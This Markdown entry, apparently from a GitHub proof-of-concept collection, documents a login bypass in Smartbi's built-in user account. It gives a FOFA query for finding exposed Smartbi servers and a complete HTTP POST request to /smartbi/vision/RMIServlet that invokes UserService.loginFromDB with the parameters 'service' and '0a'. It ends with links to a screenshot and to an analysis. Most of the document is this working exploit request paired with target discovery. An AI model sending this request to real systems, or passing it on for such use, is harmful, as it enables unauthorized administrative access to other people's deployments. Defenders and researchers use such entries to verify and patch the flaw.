## Smartbi 内置用户登陆绕过

## fofa
```
app="SMARTBI"
```

## poc
```
POST /smartbi/vision/RMIServlet HTTP/1.1
Host: 172.16.170.231:18080
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 68

className=UserService&methodName=loginFromDB&params=["service","0a"]

```

![image](https://github.com/wy876/POC/assets/139549762/419e82b7-4236-416d-91ef-74caf533e8ae)


## 漏洞分析
- https://exp.ci/2023/06/17/Smartbi-%E5%86%85%E7%BD%AE%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/
